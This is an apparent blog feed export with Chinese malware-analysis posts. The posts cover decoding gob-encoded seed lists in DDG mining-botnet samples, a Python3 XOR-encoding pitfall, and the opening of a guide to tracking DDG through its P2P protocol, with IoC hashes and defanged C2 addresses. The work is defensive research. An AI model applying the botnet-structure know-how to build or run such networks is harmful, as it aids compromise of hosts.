class="line"><span class="keyword">for</span> _, seedNode := <span class="keyword">range</span> d &#123;</div><div class="line">	fmt.Printf(<span class="string">"%s:%d\n"</span>, seedNode.IP, seedNode.Port)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>完整代码链接： <a href="https://github.com/0xjiayu/decode_gob_in_ddgs_v4005/blob/master/hubs_dump.go" target="_blank" rel="external">https://github.com/0xjiayu/decode_gob_in_ddgs_v4005/blob/master/hubs_dump.go</a> </p>
<h2 id="5-辅助工具——degob"><a href="#5-辅助工具——degob" class="headerlink" title="5. 辅助工具——degob"></a>5. 辅助工具——degob</h2><p>DDG v4005 的样本中涉及的 gob 数据编码，原始数据结构简单，逆向难度不高。如果遇到结构更复杂的数据经 gob 序列化编码，逆向难度肯定要增加。如果有一款工具可以自动化把任意 gob 序列化后的数据还原，最好不过了。</p>
<p>Google 一番，我找到了一个还算理想的工具，degob，专为逆向分析 gob 编码数据而生： <a href="https://gitlab.com/drosseau/degob" target="_blank" rel="external">https://gitlab.com/drosseau/degob</a> </p>
<p>不过 degob 并不完美，它只能解析出 Go 最底层的数据类型。比如本文中用到的 <code>net.IP</code>，定义为：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">type</span> IP []<span class="keyword">byte</span></div></pre></td></tr></table></figure>
<p>那么 degob 解析数据的时候，就会把 <code>net.IP</code> 这一个成员表示为 <code>[]byte</code>，至于这个 <code>[]byte</code> 的<strong>高层结构类型</strong>代表什么，还需要结合样本逆向来确认。比如我逆向时发现样本中用 <code>net.IP.String()</code> 函数来解析这个数据成员，那么就可以确定，degob 解析出来的 <code>[]byte</code> ，其实就是 <code>net.IP</code>。degob 解析上述 Raw Data，得出的数据结构定义为：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// []Anon65_5e8660ee</span></div><div class="line"></div><div class="line"><span class="comment">// type ID: 65</span></div><div class="line"><span class="keyword">type</span> Anon65_5e8660ee <span class="keyword">struct</span> &#123;</div><div class="line">        IP []<span class="keyword">byte</span></div><div class="line">        Port <span class="keyword">int64</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后就是 degob 解出来的部分数据(不完美解析，需要结合样本逆向才能确认 IP 的真实结构类型)：</p>
<p><img src="/imgs/decrypt_gob/degob_output.png" style="zoom:60%;"></p>
<p>不过，这个 degob 两年没更新了，作者可能也不维护了，在它的 <strong>cmds/degob/main.go</strong> 文件中还有一个 Bug，命令行参数把 <strong>inFile</strong> 误写成了 <strong>outFile</strong> ：</p>
<p><img src="/imgs/decrypt_gob/bug_of_degob.png" alt=""></p>
<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>DDG 的恶意样本中还有另外一个序列化数据的解码，即用 <a href="https://msgpack.org/" target="_blank" rel="external">msgPack</a> 编码的云端配置数据。如果要用 msgPack 的 Go 语言 SDK 去解码这个配置文件，需要逆向分析出更复杂的配置数据结构定义(在 <a href="https://www.anquanke.com/post/id/177742" target="_blank" rel="external">以P2P的方式追踪 DDG 僵尸网络(下)</a> 一文中有详细阐述)。不过好在 msgPack 是个通用的序列化编码方案，除了 Go，还支持其他语言，比如 Python。更方便的是，用 msgPack for Python 来对序列化数据进行解码并不需要预先知道数据结构定义即可直接解码，这就大大降低了逆向工作的难度。</p>
<p>然而 gob 序列化只属于 Go 语言自有，并没有其他语言的 SDK，要想逆向解码 gob 序列化编码过的二进制数据数据，就必须分析出原始的数据结构定义。这样来看， gob 序列化数据逆向解码并没有万全之策，即使有 degob 这种工具的加持，也得结合样本逆向分析才能精准解析、还原明文数据。</p>
<p>本文用到的 Go 语言程序、从样本中提取的 gob 编码的原始二进制数据以及样本运行时的 debug 日志，都上传到 Github，感兴趣的师傅自取：</p>
<p> <a href="https://github.com/0xjiayu/decode_gob_in_ddgs_v4005" target="_blank" rel="external">https://github.com/0xjiayu/decode_gob_in_ddgs_v4005</a> </p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;本文首发于安全客，原文链接：&lt;/strong&gt;&lt;br&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/192948&quot;&gt;https://www.anquanke.com/post/id/192948&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1. 概述&quot;&gt;&lt;/a&gt;1. 概述&lt;/h2&gt;&lt;p&gt;DDG 是一个 一直活跃的挖矿僵尸网络，其主样本由 Go 语言编写。它最新活跃的版本中用基于 Gossip 协议实现集群管理的第三方库 &lt;strong&gt;&lt;a href=&quot;https://github.com/hashicorp/memberlist&quot;&gt;Memberlist&lt;/a&gt;&lt;/strong&gt; 把整个僵尸网络构建成了一个非典型的 P2P 结构。关于其 P2P 网络结构以及如何基于 P2P 特性追踪该僵尸网络，我在以前的两篇文章中有详细描述：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/177665&quot;&gt;以P2P的方式追踪 DDG 僵尸网络(上)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/177742&quot;&gt;以P2P的方式追踪 DDG 僵尸网络(下)&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;11.6 日晚上，我的 DDG 挖矿僵尸网络追踪程序检测到 DDG 家族更新到了版本 4005，IoC 如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;MD5:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;64c6692496110c0bdce7be1bc7cffd47  ddgs.i686&lt;/li&gt;
&lt;li&gt;638061d2a06ebdfc82a189cf027d8136  ddgs.x86_64 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;CC&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;67.207.95[.]103:8000&lt;/li&gt;
&lt;li&gt;103.219.112[.]66:8000 &lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;经过简单的分析，新版恶意样本的关键行为与旧版本差异不大，以前部署的追踪程序依然能持续追踪。不过其中一个小的技术点引起了我的注意。&lt;/p&gt;
&lt;p&gt;以前说过，DDG 样本为了通过 Memberlist 库加入 P2P 网络(函数 &lt;code&gt;Memberlist.join()&lt;/code&gt;)，需要一批初始的 P2P Nodes ，新的样本代表的 P2P 节点会通过这些初始的 P2P Nodes 加入 P2P 网络。在旧版样本中，这些初始的 P2P Nodes 被称为 &lt;strong&gt;Hub List&lt;/strong&gt;，其中约有 200 个 节点 IP 地址，这一份 IP 列表以 Hex 数组形式硬编码保存在样本中。而新版 DDG 样本中则把这些 P2P Nodes 称为 &lt;strong&gt;Seeds&lt;/strong&gt;(Memberlist 库 &lt;code&gt;Join()&lt;/code&gt; 函数的 ”种子“)，这些 Seeds 用 &lt;a href=&quot;https://blog.golang.org/gobs-of-data&quot;&gt;Golang gob&lt;/a&gt; 序列化编码后再硬编码保存在样本中，样本里还用一组 &lt;code&gt;ddgs_network__mlUtils_*&lt;/code&gt; 函数来处理这些 Seeds：&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="ddg" scheme="http://jiayu0x.com/tags/ddg/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="gob" scheme="http://jiayu0x.com/tags/gob/"/>
    
      <category term="decode" scheme="http://jiayu0x.com/tags/decode/"/>
    
  </entry>
  
  <entry>
    <title>浅谈 Python3 中对二进制数据 XOR 编码的正确姿势</title>
    <link href="http://jiayu0x.com/2019/05/26/The_right_way_to_xor_encoding_with_python3/"/>
    <id>http://jiayu0x.com/2019/05/26/The_right_way_to_xor_encoding_with_python3/</id>
    <published>2019-05-25T16:00:00.000Z</published>
    <updated>2019-05-26T15:00:55.432Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>Python3 中的默认编码是 UTF-8，这给大家写 Python 代码带来了很大的便利，不用再像 Python2.x 那样为数据编码操碎了心。但是，由于全面转向 UTF-8 编码，Python3 里面会有一些小细节，稍有不慎容易栽坑。本文就对二进制数据 XOR 编码这一种操作，浅析 Py2/Py3 中默认编码相关的一个细节小差异而引起的小 Bug。</p>
</blockquote>
<p>XOR 编码是最简单有效的编码方法之一，虽然简单，但仍然应用广泛。在分析恶意样本时，经常会遇到样本内置的隐秘数据或者网络通信数据，用到了 XOR 编码。比如，一个典型就是 XOR.DDoS 家族，它样本内部关键字符串全用 XOR 编码过，而且其网络通信中 Bot 发给 C2 的上线数据包和 C2 给 Bot 下发的控制指令数据包中均涉及 XOR 编码/解码操作。</p>
<a id="more"></a>
<p>对于这类样本，分析的时候我们不免要写一些自动化的解析脚本，把其中的编码数据还原成名文以便分析。在其他开发场景中也偶尔会用 Python 写一些 XOR 编码/解码的程序。网上一搜 「Python XOR 编码 加密」或者「Python XOR encoding crypt」，都会搜出很多别人发出来的 Python XOR 编解码脚本，大多数情况下拿来直接用就行。比如我搜来的几个中文帖子中的相关脚本（本人不保证下面截图里代码的正确性）：</p>
<p><img src="/imgs/py2_xorfunc_1.png" alt=""></p>
<p><img src="/imgs/py2_xorfunc_2.png" alt=""></p>
<p><img src="/imgs/py2_xorfunc_3.png" alt=""></p>
<p><img src="/imgs/py2_xorfunc_4.png" alt=""></p>
<p>这些脚本，在 Python2 环境下都没有问题，都可以正确进行 XOR 编解码，然而如果直接拿到 Python3 环境下去运行，却会发生一个不容易发现的小 Bug。来看一段在 ipthon3 里的操作记录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">In [1]: def xor_crypt(data, key):</div><div class="line">   ...:     cipher_data = []</div><div class="line">   ...:     len_data = len(data)</div><div class="line">   ...:     len_key = len(key)</div><div class="line">   ...:     for idx in range(len_data):</div><div class="line">   ...:         bias = key[idx % len_key]</div><div class="line">   ...:         curr_byte = data[idx]</div><div class="line">   ...:         cipher_data.append(chr(bias ^ curr_byte))</div><div class="line">   ...:     return bytearray(&quot;&quot;.join(cipher_data).encode())</div><div class="line">   ...:</div><div class="line"></div><div class="line">In [2]: xor_key = b&apos;0123456789&apos;</div><div class="line"></div><div class="line">In [3]: sam1 = b&apos;abcdefgh&apos;</div><div class="line"></div><div class="line">In [4]: sam2 = b&apos;abcdefghijklmnopqrstuvwxyz&apos;</div><div class="line"></div><div class="line">In [5]: print(xor_crypt(sam1,xor_key))</div><div class="line">bytearray(b&apos;QSQWQSQ_&apos;)</div><div class="line"></div><div class="line">In [6]: print(xor_crypt(xor_crypt(sam1,xor_key), xor_key))</div><div class="line">bytearray(b&apos;abcdefgh&apos;)</div><div class="line"></div><div class="line">In [7]: print(xor_crypt(sam2, xor_key))</div><div class="line">bytearray(b&apos;QSQWQSQ_QS[]_][EGEKMEGEKMO&apos;)</div><div class="line"></div><div class="line">In [8]: print(xor_crypt(xor_crypt(sam2,xor_key), xor_key))</div><div class="line">bytearray(b&apos;abcdefghijklmnopqrstuvwxyz&apos;)</div><div class="line"></div><div class="line">In [9]: sam3 = b&apos;\x7f\x80\x81\x90\x91\xA0\xA1\xB0\xB1\xC0\xC1\xD0\xD1\xE0\xE1\xF0\xF1\xFA&apos;</div><div class="line"></div><div class="line">In [10]: print(xor_crypt(sam3, xor_key))</div><div class="line">bytearray(b&apos;O\xc2\xb1\xc2\xb3\xc2\xa3\xc2\xa5\xc2\x95\xc2\x97\xc2\x87\xc2\x89\xc3\xb9\xc3\xb1\xc3\xa1\xc3\xa3\xc3\x93\xc3\x95\xc3\x85\xc3\x87\xc3\x8d&apos;)</div><div class="line"></div><div class="line">In [11]: print(xor_crypt(xor_crypt(sam3,xor_key), xor_key))</div><div class="line">bytearray(b&apos;\x7f\xc3\xb3\xc2\x83\xc3\xb1\xc2\x87\xc3\xb7\xc2\x95\xc3\xb5\xc2\x9d\xc3\xbb\xc2\xa5\xc3\xb3\xc2\xa5\xc3\xb1\xc2\xb3\xc3\xb7\xc2\xbf\xc3\xb4\xc2\x81\xc3\xba\xc2\x81\xc3\xb2\xc2\x93\xc3\xb0\xc2\x97\xc3\xb6\xc2\xa5\xc3\xb4\xc2\xad\xc3\xba\xc2\xb5\xc3\xb2\xc2\xb5\xc3\xb0\xc2\xb9&apos;)</div><div class="line"></div><div class="line">In [12]: print(len(sam3))</div><div class="line">18</div><div class="line"></div><div class="line">In [13]: print(len(xor_crypt(xor_crypt(sam3,xor_key), xor_key)))</div><div class="line">69</div></pre></td></tr></table></figure>
<p>可以看到，仿照 Python2 环境下那些常用的 XOR 编码操作写的函数，在 Python3 环境下，偶尔会出现意料之外的结果：上面的操作记录中，对于 <strong>sam1</strong> 和 <strong>sam2</strong> 两个全都是可打印字符的字节串进行 XOR 编解码是没有问题的；但是对于 <strong>sam3</strong> ，一个内含大量 HEX 值大于 <strong>0x7F</strong> 的非可打印字符字节串，原本是 18 个字节，进行两次 XOR 操作之后竟然变成了 69 个字节。</p>
<p>这就十分蹊跷了。问题出在哪个环节？是函数内部的字节列表 <strong>cipher_data</strong> 的问题，还是最后 <strong>bytearray()</strong> 操作出了问题，还是进行 XOR 计算的时候，<strong>chr()</strong> 函数的问题？</p>
<p>经过一番排查，发现这是 <strong>chr()</strong> 函数的问题。先看这个函数在 Python2 和 Python3 中各有什么表现：</p>
<p><img src="/imgs/python3_sample.png" alt=""></p>
<p><img src="/imgs/python2_sample.png" alt=""></p>
<p>在 Python2 版本中，除了 <strong>chr()</strong> 还有一个 <strong>unichr()</strong> ，可以看到 Py2 中的 <strong>unichr()</strong> 与Py3 中的 <strong>chr()</strong> 行为是一致的：对于 HEX 值大于 0x7F 的字符，返回值占 2 Bytes；对于 HEX 值小于或等于 0x7F 的字符，返回值占 1 Byte。</p>
<p>为什么会出现这么个差异？刚开始一直以为 <strong>chr()</strong> 函数只会返回 1 Byte 的结果，对此感到很是不解。</p>
<p>查阅一下 Py2 中 <strong>chr()</strong> 和 <strong>unichr()</strong> 的文档如下：</p>
<p><img src="/imgs/py2_chr_doc.png" alt=""></p>
<p><img src="/imgs/py2_unichr_doc.png" alt=""></p>
<p>而 Py3 中 <strong>chr()</strong> 函数的文档说明如下：</p>
<p><img src="/imgs/py3_chr_doc.png" alt=""></p>
<p>从文档来看， Py3 中的 <strong>chr()</strong> 函数确实对应到了 Py2 中的 <strong>unichr()</strong> 函数，只返回 Unicode 编码的结果。在点破最后的一层窗户纸之前，我们再去 CPython 的源码里瞅一眼，以便把这个结论锤结实了。</p>
<p>Py3 中的 <strong>chr()</strong> 函数，源码中是这样实现的：</p>
<p><img src="/imgs/cpython_bltinmodule_pyobject_chr.png" alt=""></p>
<p><img src="/imgs/cpython_builtin_chr_impl.png" alt=""></p>
<p><img src="/imgs/cpython_objects_PyUnicode_FromOrdinal.png" alt=""></p>
<p>至于其中的 <strong>unicode_char()</strong> 函数如何实现，我们就不深究了，知道它就是返回一个 Unicode 编码的字符即可。再看 Py2 中 <strong>unichr()</strong> 函数：</p>
<p><img src="/imgs/cpython_27_unichr.png" alt="">   </p>
<p>如出一辙有木有。</p>
<p>那<strong>最后一层窗户纸</strong>到底是什么？就是 Py3 默认的 UTF-8 编码了。在  <a href="http://www.utf-8.com" target="_blank" rel="external">http://www.utf-8.com</a> 网站上有这么一段话：</p>
<blockquote>
<p>UTF-8 encodes each Unicode character as a <strong>variable number of 1 to 4 octets</strong>, where the number of octets depends on the integer value assigned to the Unicode character. It is an efficient encoding of Unicode documents that use mostly US-ASCII characters because <strong>it represents each character in the range U+0000 through U+007F as a single octet</strong>.</p>
</blockquote>
<p>注意上面加粗部分的重点：</p>
<ol>
<li>UTF-8 编码的字符占 1~4 个字节；</li>
<li>字符 U+0000 到 U+007F 都用一个字节来表示，其它字符 1 个字节不够，就用 2~4 个字节来表示。</li>
</ol>
<p>这样就明确上面问题的原因了：Py3 中的 <strong>chr()</strong> 函数，只有在参数的 HEX 值位于 [0x00, 0x7F] 区间内的时候才返回 1 Byte 的结果，这个结果同于 Py2 中的 <strong>chr()</strong> 函数；当 HEX 值大于 0x7F ，其返回值占 2 Bytes，行为同于 Py2 中的 <strong>unichr()</strong> 函数。</p>
<p>那么 Py3 中正确的 XOR 编解码姿势是什么？上面 ipython3 操作记录中的函数稍加改动即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_crypt</span><span class="params">(data, key)</span>:</span></div><div class="line">    cipher_data = []</div><div class="line">    len_data = len(data)</div><div class="line">    len_key = len(key)</div><div class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> range(len_data):</div><div class="line">        bias = key[idx % len_key]</div><div class="line">        curr_byte = data[idx]</div><div class="line">        cipher_data.append(bias ^ curr_byte)</div><div class="line">    <span class="keyword">return</span> bytearray(cipher_data)</div></pre></td></tr></table></figure>
<p>当然，还有更简洁的写法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">XORCrypt</span><span class="params">(data, key)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(a^b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(*map(bytearray, [data, key])))</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Python3 中的默认编码是 UTF-8，这给大家写 Python 代码带来了很大的便利，不用再像 Python2.x 那样为数据编码操碎了心。但是，由于全面转向 UTF-8 编码，Python3 里面会有一些小细节，稍有不慎容易栽坑。本文就对二进制数据 XOR 编码这一种操作，浅析 Py2/Py3 中默认编码相关的一个细节小差异而引起的小 Bug。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;XOR 编码是最简单有效的编码方法之一，虽然简单，但仍然应用广泛。在分析恶意样本时，经常会遇到样本内置的隐秘数据或者网络通信数据，用到了 XOR 编码。比如，一个典型就是 XOR.DDoS 家族，它样本内部关键字符串全用 XOR 编码过，而且其网络通信中 Bot 发给 C2 的上线数据包和 C2 给 Bot 下发的控制指令数据包中均涉及 XOR 编码/解码操作。&lt;/p&gt;
    
    </summary>
    
      <category term="dev" scheme="http://jiayu0x.com/categories/dev/"/>
    
    
      <category term="dev" scheme="http://jiayu0x.com/tags/dev/"/>
    
      <category term="python" scheme="http://jiayu0x.com/tags/python/"/>
    
      <category term="xor" scheme="http://jiayu0x.com/tags/xor/"/>
    
  </entry>
  
  <entry>
    <title>以 P2P 的方式追踪 DDG 僵尸网络</title>
    <link href="http://jiayu0x.com/2019/04/11/track-ddg-botnet-by-p2p-protocol/"/>
    <id>http://jiayu0x.com/2019/04/11/track-ddg-botnet-by-p2p-protocol/</id>
    <published>2019-04-10T16:00:00.000Z</published>
    <updated>2019-05-11T06:35:23.036Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>本系列文章从 Botnet(僵尸网络)的基础概念说起，围绕实现了 P2P 特性的 DDG.Mining.Botnet，一步一步设计一个基于 P2P 的僵尸网络追踪程序，来追踪 DDG。DDG 是一个目前仍十分活跃的 Botnet，读懂本文，再加上一些辅助分析工作，就可以自行实现一套针对 DDG 的 P2P 僵尸网络跟踪程序<br> <strong>文章分为三部分</strong>：</p>
<ol>
<li>Botnet 简介</li>
<li>DDG.Mining.Botnet 介绍，着重介绍其涉及的 P2P 特性；</li>
<li>根据 DDG.Mining.Botnet 的 P2P 特性，设计一个僵尸网络跟踪程序 DDG.P2P.Tracker，来遍历 Botnet 中的节点、及时获取最新的云端配置文件、及时获知 Botnet 中最新启用的 C&amp;C 服务器。</li>
</ol>
</blockquote>
<p>文章首发于安全客，原文链接：</p>
<ol>
<li><a href="https://www.anquanke.com/post/id/177665" target="_blank" rel="external">以P2P的方式追踪 DDG 僵尸网络（上）</a></li>
<li><a href="https://www.anquanke.com/post/id/177742" target="_blank" rel="external">以P2P的方式追踪 DDG 僵尸网络（下）</a></li>
</ol>
<a id="more"></a>
<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><h3 id="1-1-Botnet-及其网络结构"><a href="#1-1-Botnet-及其网络结构" class="headerlink" title="1.1 Botnet 及其网络结构"></a>1.1 Botnet 及其网络结构</h3><h4 id="1-1-1-Botnet-简介"><a href="#1-1-1-Botnet-简介" class="headerlink" title="1.1.1 Botnet 简介"></a>1.1.1 Botnet 简介</h4><p><strong>Botnet(僵尸网络)</strong>没有一个准确的定义，关于什么是 Botnet，众说纷纭，总结起来不外乎两大特性：</p>
<ol>
<li>众多被入侵的僵尸主机，上面运行着相同的 Botnet 客户端恶意程序，这些众多的僵尸主机组成一个大型的“网络”(顾名思义被称作<strong>僵尸网络</strong>)，可以进行统一的恶意活动——<strong>主要特性</strong>；</li>
<li>僵尸网络实施的统一的恶意活动，由 C&amp;C(Command and Control)服务来控制，一般说来，是可以长时间持续控制——<strong>次要特性</strong>。</li>
</ol>
<p>Botnet 常见的恶意活动有实施 DDoS 攻击、用来做 Proxy Server 或者发送垃圾邮件等等。一个典型 DDoS Botnet 的大致结构如下图所示：</p>
<p><img src="/imgs/ddos_botnet.png" style="zoom:40%"></p>
<h4 id="1-1-2-传统-Botnet"><a href="#1-1-2-传统-Botnet" class="headerlink" title="1.1.2 传统 Botnet"></a>1.1.2 传统 Botnet</h4><p>传统的 Botnet，一般指<strong>可以通过少数特定C&amp;C服务器来集中式控制的僵尸网络</strong>，用来给僵尸主机上的 Botnet 客户端恶意程序下发指令的服务器，叫做 <strong>C&amp;C 服务器</strong>(Command and Control Server)。其网络模型基于 Client-Server 模型，属于<strong>中心化控制(Centralized Control)</strong>方式。其概要结构图如下(中间的图标代表 C&amp;C 服务器)：</p>
<p><img src="/imgs/traditional_botnet_structure.png" style="zoom:40%"></p>
<p>这种网络结构只有一个或者少数几个 C&amp;C 服务器，一旦 C&amp;C 服务器被封堵、屏蔽，整个 Botnet 就轰然倒塌，脆弱性是显而易见的。所以，这种网络结构的 Botnet 发展历程中，从样本层面到网络设施层面都衍生了错综复杂的对抗措施，二进制样本层面的对抗之外，从 DGA 到 Fast-Flux，到借助于公共网络服务的 C&amp;C 通道，再到近两年基于区块链的域名解析，最终目的都是提高这种 Botnet 背后 C&amp;C 服务的健壮性，以降低被轻易摧毁的可能性。</p>
<h4 id="1-1-3-P2P-Botnet"><a href="#1-1-3-P2P-Botnet" class="headerlink" title="1.1.3 P2P Botnet"></a>1.1.3 P2P Botnet</h4><p>为了避免传统 Botnet 中的 <strong>单点故障</strong> 现象，也不想使用太复杂的技术来提高个别 C&amp;C 服务的健壮性，去中心化的 P2P Botnet 应运而生。基于 P2P 协议实现的 Botnet，不再需要中心化的 C&amp;C 服务器，只靠 Bot 节点之间各自通信，传播指令或者恶意文件。而 Botnet 的控制者(BotMaster)就隐藏在大批量的 Bot 节点中，悄悄控制着整个 Botnet。</p>
<p>这样以来至少有两个显而易见的好处：一方面消除了传统 Botnet 中的中心化控制带来的单点故障因素，另一方面还让 BotMaster 更加隐蔽。</p>
<p>关于 P2P Botnet，有 3 个方面要阐述清楚，才能更好地理解这种 Botnet。</p>
<p><strong>一</strong>是所使用的 <strong>P2P 协议</strong>。P2P 协议有很多种，并且不止一种 P2P 协议可以用来组建 P2P Botnet。目前最常见的 P2P 协议莫过于基于 <a href="https://en.wikipedia.org/wiki/Distributed_hash_table" target="_blank" rel="external">DHT</a> 实现的 P2P 协议，用来构建 P2P 文件共享网络的 BitTorrent 协议，也是基于 DHT 协议实现。</p>
<p><strong>二</strong>是 Botnet 的<strong>控制方式</strong>。前面说过 P2P Botnet 中，BotMaster 控制着其中一个 Bot 节点（后文简称 <strong>SBot</strong> ），隐藏在大批量的 Bot 节点中，通过 SBot 节点，向整个 Botnet 发出控制指令或者更新恶意文件。根据 P2P 协议特性，理论上任何人都可以加入这个网络并与其他节点通信。整个过程中，BotMaster 必须保证只有他自己可以发送有效的控制指令或文件，其他节点可以进行常规通信(遍历节点、查询临近节点信息、接收指令或文件等等)，但不能发送控制指令或文件。其他节点发出的指令或文件，整个网络中的 Bot 节点都不会接受。</p>
<p>要实现这样的特性，BotMaster 必须给这些关键通信加上校验机制。比如利用非对称加密算法，通过只有 BotMaster 一人掌握的密钥给通信内容加上数字签名。接收到指令或文件的 Bot 节点，会用自己的另一个密钥来校验数据的合法性，合法的通信才接受，非法的则丢弃。</p>
<p><strong>三</strong>是 P2P Botnet 的<strong>网络结构</strong>。P2P Botnet 的结构，就是典型的 P2P 网络结构，如图所示：</p>
<p><img src="/imgs/p2p_botnet_structure.png" style="zoom:50%"></p>
<p>这其实是一个简化的网络模型，考虑到 NAT 的存在，这种模型图并不能精准描述 P2P Botnet 的网络结构。对此， <a href="https://twitter.com/MalwareTechBlog" target="_blank" rel="external">@MalwareTechBlog</a> 在 <a href="https://www.malwaretech.com/2013/12/peer-to-peer-botnets-for-beginners.html" target="_blank" rel="external">Peer-to-Peer Botnets for Beginners</a> 中有详细描述，他给出的 P2P Botnet 网络结构图如下：</p>
<p><img src="/imgs/nodes.png" alt=""></p>
<h4 id="1-1-4-挖矿僵尸网络"><a href="#1-1-4-挖矿僵尸网络" class="headerlink" title="1.1.4 挖矿僵尸网络"></a>1.1.4 挖矿僵尸网络</h4><p>文章开头说了 Botnet 的两大特性，第二条算是<strong>次要特性</strong>，这样说的理由，配合挖矿僵尸网络(Mining Botnet)来解释更容易理解。</p>
<p>一般说来，无论是传统 Botnet  还是 P2P Botnet，都有一个 C&amp;C 服务来持续控制它，比如控制它今天 DDoS 一个网站，明天给某个帖子刷量，后天又去发一波垃圾邮件……但近些年来，随着挖矿僵尸网络的盛行，由于盈利模式的简单粗暴，致使 Botnet 的网络结构也发生了细微的变化：<strong>挖矿僵尸网络可以不再需要一个持续控制的 C&amp;C 服务</strong>。</p>
<p>对于<strong>纯粹的</strong>挖矿僵尸网络，它的恶意活动是单一而且确定的：<strong>挖矿</strong>，所以可以不再需要一个 C&amp;C 服务来给它下发指令来实施恶意活动；它的恶意活动是持续进行的，不间断也不用切换任务，所以也不需要一个 C&amp;C 服务来<strong>持续控制</strong>。挖矿僵尸网络要做的事情，从在受害主机上植入恶意矿机程序开始，就可以放任不管了。甚至 BotMaster 都不需要做一个 Report 服务来统计都有哪些僵尸节点来给自己挖矿，自己只需要不断地<strong>入侵主机–&gt;植入矿机–&gt;启动矿机程序挖矿</strong>，然后坐等收益即可。</p>
<p>这只是比较简单粗暴的情况，即使没有一个持续控制的 C&amp;C 服务，我们也把它叫做 Botnet——Mining.Botnet。不过为了谨慎起见，窃以为还要加上一个特性：恶意程序的<strong>蠕虫特性</strong>。如果一个攻击者，它的相关恶意程序没有蠕虫特性，只是自己通过批量扫描+漏洞利用批量拿肉鸡，然后往肉鸡上批量植入恶意矿机程序来盈利，我们并不认为它植入的这些矿机程序组成了一个 Botnet。一旦有了蠕虫特性，恶意程序会自己主动传播，一步步构建成一个统一的<strong>网络</strong>，然后统一挖矿来为黑客牟利，我们才会把它叫做 Mining.Botnet(之所以有这个认识，可能是因为目前曝光的绝大多数稍具规模或者危害稍大的挖矿僵尸网络，其中恶意样本或多或少都有蠕虫特性)。</p>
<p>这样，纯粹的 Mining.Botnet 可以只满足文章开头提到的第一个特性，只要自身恶意程序有蠕虫特性，我们还是可以把它称为 Botnet。</p>
<p>当然，这只是为了说明 Botnet 网络架构微小变化而举的简单粗暴的例子。现实中遇到的 Mining.Botnet ，大多要更复杂一些。一般至少会有一个服务器提供恶意样本的下载，有的会提供一个云端的配置文件来控制矿机工作，有的会自建矿池代理服务，有的会在入侵、传播阶段设置更加复杂的服务端控制，还有的在持久驻留失陷主机方面做复杂的对抗……需要注意的是，这些真实存在的 Mining.Botnet 中，这些恶意服务器提供的多是下载、代理服务，而不一定具有传统 Botnet C&amp;C 服务那样<strong>下发控制指令</strong>的功能。</p>
<h3 id="1-2-对-Botnet-的处置措施"><a href="#1-2-对-Botnet-的处置措施" class="headerlink" title="1.2 对 Botnet 的处置措施"></a>1.2 对 Botnet 的处置措施</h3><p>对于 Botnet，安全研究人员 OR 安全厂商可以采取的措施，大致有以下几种：</p>
<ol>
